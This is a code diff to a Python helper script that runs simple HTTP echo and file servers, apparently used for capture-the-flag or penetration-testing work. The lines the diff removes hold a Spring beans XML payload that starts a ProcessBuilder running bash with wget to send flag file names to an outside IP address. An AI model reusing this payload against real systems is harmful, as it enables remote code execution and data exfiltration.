@@ -197,37 +197,24 @@ class HttpFile(_BaseHttpServer):
 
 if __name__ == "__main__":
     from base import run_cmd, set_debug
+    from tool.bash_obf import demo
 
-    # 开启调试日志
+    #
+    # # with 用法
+    # print("\n=== 测试 HttpEcho ===")
+    # with HttpEcho():
+    #     run_cmd("curl http://0.0.0.0:8000 -d 'HttpEcho with debug logs'")
+    # print("\n=== 测试 HttpFile ===")
+    # with HttpFile({"abc.txt": b"HttpFile content"}):
+    #     cr = run_cmd("curl http://0.0.0.0:8001/abc.txt -o /tmp/abc.txt;cat /tmp/abc.txt")
+    #     print(f"[下载结果] {cr.output}")
+
+
+
+
+    demo()
     set_debug()
-
-    # with 用法
-    print("\n=== 测试 HttpEcho ===")
-    with HttpEcho():
-        run_cmd("curl http://0.0.0.0:8000 -d 'HttpEcho with debug logs'")
-    print("\n=== 测试 HttpFile ===")
-    with HttpFile({"abc.txt": b"HttpFile content"}):
-        cr = run_cmd("curl http://0.0.0.0:8001/abc.txt -o /tmp/abc.txt;cat /tmp/abc.txt")
-        print(f"[下载结果] {cr.output}")
-
-
-
-    xml = f"""<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-    <constructor-arg>
-    <list>
-    <value>/bin/bash</value>
-    <value>-c</value>
-    <value><![CDATA[wget --method=POST --body-data=$(ls /tmp | grep flag-) http://10.225.95.12:8000/]]></value>
-    </list>
-    </constructor-arg>
-    </bean>
-    </beans>""".encode()
-    files = {"xml.xml": xml}
-    http_echo = HttpEcho(port=8000)
+    http_echo = HttpEcho()
     http_echo.start()
-    http_file = HttpFile(files, port=8001)
-    http_file.start()
     input("服务器运行中，按回车停止...")
     http_echo.stop()
-    http_file.stop()
